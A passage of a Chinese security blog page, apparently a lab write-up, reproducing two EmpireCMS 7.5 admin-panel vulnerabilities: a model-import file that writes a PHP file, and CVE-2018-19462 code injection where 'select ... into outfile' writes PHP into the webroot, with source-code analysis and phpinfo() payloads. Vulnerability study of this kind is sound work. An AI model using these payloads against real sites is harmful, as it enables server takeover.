+    ChangeMForm($mid,$tid,$modr[mtemp]);//更新表单
+    ChangeQmForm($mid,$tid,$modr[qmtemp]);//更新前台表单
+    ChangeMCj($mid,$tid,$modr[cj]);//采集表单
+    //删除文件
+    DelFiletext($path);
+    //操作日志
+    insert_dolog("tid=$tid&tb=$tbname<br>mid=$mid");
+    printerror("LoadInModSuccess","db/ListTable.php".hReturnEcmsHashStrHref2(1));
+    &#125;
+    </codes></pre>
+</details>
+
+
+<p>关键代码分析如下（因为代码太长了==就截图出来）</p>
+<p><img src="https://i.loli.net/2021/02/14/Hu1JlL5yQcOomKk.png" srcset="/img/loading.gif"></p>
+<p>如下</p>
+<p><code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p>
+<p><code>&lt;?php file_put_contents(“info.php”,”&lt;?php phpinfo(); ?&gt;”); ?&gt;</code></p>
+<p>上传的文件被包含（被php解析）就会执行以上代码，从而在同目录下创建 <code>info.php</code> (<code>&lt;?php phpinfo(); ?&gt;”); ?&gt;</code>)</p>
+<p>那么来复现一下：</p>
+<p>按照如下操作进入上传页面</p>
+<p><img src="https://i.loli.net/2021/02/14/Igh9rTBwJ16nzDu.png" srcset="/img/loading.gif"></p>
+<p><img src="https://i.loli.net/2021/02/14/SI7Vw1JAtyqQhKu.png" srcset="/img/loading.gif" alt="上传页面"></p>
+<p>构造一个内容为</p>
+<p><code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p>
+<p>或<code>&lt;?php file_put_contents(“info.php”,”&lt;?php phpinfo(); ?&gt;”); ?&gt;</code></p>
+<p>的.mod后缀的文件</p>
+<p><img src="https://i.loli.net/2021/02/14/x17kit5zP9vr8sJ.png" srcset="/img/loading.gif" alt="创建文件~"></p>
+<p><img src="https://i.loli.net/2021/02/14/bSVqfcGsriWaKpD.png" srcset="/img/loading.gif" alt="导入~"></p>
+<p>可以看到文件成功写入了<br><img src="https://i.loli.net/2021/02/14/bWnH2d4LjRxMgaw.png" srcset="/img/loading.gif" alt="成功写入"></p>
+<p>访问即可<br><img src="https://i.loli.net/2021/02/14/o7HhIAsL9CYd6rZ.png" srcset="/img/loading.gif"></p>
+<h4 id="7-5-代码注入-CVE-2018-19462"><a href="#7-5-代码注入-CVE-2018-19462" class="headerlink" title="7.5 代码注入(CVE-2018-19462)"></a>7.5 代码注入(CVE-2018-19462)</h4><blockquote>
+<p>影响版本：帝国CMS(EmpireCMS) &lt;= 7.5</p>
+<p>描述：EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。</p>
+</blockquote>
+<p>漏洞出现页面：</p>
+<p>这里其实是使用了文件引用，引用了文件upload/e/admin/db/DoSql.php</p>
+<p><img src="https://i.loli.net/2021/02/14/DEnAXeTWalSvZR3.png" srcset="/img/loading.gif"></p>
+<p>查看DoSql.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ExecSql</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$userid</span>,<span class="hljs-variable">$username</span></span>)</span>&#123;<br>	<span class="hljs-keyword">global</span> <span class="hljs-variable">$empire</span>,<span class="hljs-variable">$dbtbpre</span>;<br>	<span class="hljs-variable">$id</span>=(<span class="hljs-keyword">int</span>)<span class="hljs-variable">$id</span>;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$id</span>))<br>	&#123;<br>		printerror(<span class="hljs-string">&#x27;EmptyExecSqlid&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br>	&#125;<br>	<span class="hljs-variable">$r</span>=<span class="hljs-variable">$empire</span>-&gt;fetch1(<span class="hljs-string">&quot;select sqltext from <span class="hljs-subst">&#123;$dbtbpre&#125;</span>enewssql where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;sqltext&#x27;</span>])<br>	&#123;<br>		printerror(<span class="hljs-string">&#x27;EmptyExecSqlid&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br>	<span class="hljs-variable">$query</span>=RepSqlTbpre(<span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;sqltext&#x27;</span>]);<span class="hljs-comment">#sqltext是上图表格上传的内容，经RepSqlTbpre处理</span><br>	DoRunQuery(<span class="hljs-variable">$query</span>);<span class="hljs-comment">#对$query处理</span><br>	<span class="hljs-comment">//操作日志</span><br>	insert_dolog(<span class="hljs-string">&quot;query=&quot;</span>.<span class="hljs-variable">$query</span>);<br>	printerror(<span class="hljs-string">&quot;DoExecSqlSuccess&quot;</span>,<span class="hljs-string">&quot;ListSql.php&quot;</span>.hReturnEcmsHashStrHref2(<span class="hljs-number">1</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>$query=RepSqlTbpre($r[&#39;sqltext&#39;]);</code>：<br>sqltext就是网页中表格上传的内容，在函数ExecSql()中由RepSqlTbpre()处理</p>
+<p>再来看一下RepSqlTbpre():</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">RepSqlTbpre</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;<span class="hljs-comment">#利用str_replace()将表的前缀进行替换</span><br>	<span class="hljs-keyword">global</span> <span class="hljs-variable">$dbtbpre</span>;<br>	<span class="hljs-variable">$sql</span>=str_replace(<span class="hljs-string">&#x27;[!db.pre!]&#x27;</span>,<span class="hljs-variable">$dbtbpre</span>,<span class="hljs-variable">$sql</span><span class="hljs-comment">#将表的前缀进行替换</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$sql</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>DoRunQuery($query);</code>：对$query处理（去除空格）,用<code>;</code>分割然后遍历，无其他限制or过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DoRunQuery</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;<br>	<span class="hljs-keyword">global</span> <span class="hljs-variable">$empire</span>;<br>	<span class="hljs-variable">$sql</span>=str_replace(<span class="hljs-string">&quot;\r&quot;</span>,<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-variable">$sql</span>);<span class="hljs-comment">#将$sql中的&quot;\r&quot;以&quot;\n&quot;替换</span><br>	<span class="hljs-variable">$ret</span>=<span class="hljs-keyword">array</span>();<br>	<span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">foreach</span>(explode(<span class="hljs-string">&quot;;\n&quot;</span>,trim(<span class="hljs-variable">$sql</span>)) <span class="hljs-keyword">as</span> <span class="hljs-variable">$query</span>)&#123;<span class="hljs-comment">#以;分割再遍历</span><br>    <span class="hljs-comment">#explode使用一个字符串切割另一个字符串，并返回数组。这里使用&quot;;\n&quot; 切割 trim($sql)</span><br>		<span class="hljs-variable">$queries</span>=explode(<span class="hljs-string">&quot;\n&quot;</span>,trim(<span class="hljs-variable">$query</span>));<span class="hljs-comment">#trim()去除字符串首尾空白</span><br>		<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$queries</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$query</span>)<br>		&#123;<br>			<span class="hljs-variable">$ret</span>[<span class="hljs-variable">$num</span>].=<span class="hljs-variable">$query</span>[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;#&#x27;</span>||<span class="hljs-variable">$query</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$query</span>[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;--&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-variable">$query</span>;<br>		&#125;<br>		<span class="hljs-variable">$num</span>++;<br>	&#125;<br>	<span class="hljs-keyword">unset</span>(<span class="hljs-variable">$sql</span>);<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ret</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$query</span>)<br>	&#123;<br>		<span class="hljs-variable">$query</span>=trim(<span class="hljs-variable">$query</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$query</span>)<br>		&#123;<br>			<span class="hljs-variable">$empire</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>由此可执行恶意的sql语句</p>
+<p>构造payload：(outfile、dumpfile)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php phpinfo(); ?&gt;&quot; <span class="hljs-keyword">into</span> outfile &quot;D:\\phpstudy_pro\\WWW\\empirecms\\myinfo.php&quot;<br></code></pre></td></tr></table></figure>
+<p>or</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php phpinfo(); ?&gt;&quot; <span class="hljs-keyword">into</span> dumpfile &quot;D:\\phpstudy_pro\\WWW\\empirecms\\myinfo.php&quot;<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/02/14/r3WmvflGnU9kVD7.png" srcset="/img/loading.gif" alt="将语句输入其中"></p>
+<p>执行成功，可以看到成功写入myinfo.php<br><img src="https://i.loli.net/2021/02/14/afoZG4bF6jCXKx8.png" srcset="/img/loading.gif" alt="执行成功，成功写入myinfo.php"></p>
+<p>访问即可触发：<br><img src="https://i.loli.net/2021/02/14/DBmZWKXjVf6YiGx.png" srcset="/img/loading.gif"></p>
+<p>如果不行的话可能是mysql安全限制的原因</p>
+<blockquote>
+<p><code>secure_file_priv</code>参数：查看具有写权限的目录</p>
+<ul>
+<li>当secure_file_priv的值为<code>null </code>，表示限制mysqld 不允许导入|导出</li>
+<li>当secure_file_priv的值<code>没有具体值</code>时（=””），表示不对mysqld 的导入|导出做限制</li>
+<li>当secure_file_priv的值为<code>/tmp/ </code>，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
+</ul>
+</blockquote>
+<p>修改<code>secure_file_priv</code>参数为空，如下；保存重启mysql即可<br><img src="https://i.loli.net/2021/02/14/UPoT3sOjrF6i5MK.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/cms/">cms</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/12/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%B0/">
+                        <span class="hidden-mobile">upload-labs靶场小记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz",
+          app_key: "y4AXlgIqQsV7Enr3IFS3r6Ck",
+          placeholder: "欢迎评论噢~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+
+
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* 
+		Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数
+        */
+		var t1 = Date.UTC(2020,12,30,00,00,00); //北京时间2020-12-30 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 自Na0h将神光棒放入此地已"+/*diffYears+" 年 "+*/diffDays+" 天"+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒🌩٩(๏̯๏)۶❤ ";
+	}
+	siteTime();
+</script>
+
+
+</footer>
+
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-MLL1PZ9RBK', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=260676474"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', '260676474');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+
+
+
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+</body>
+</html>
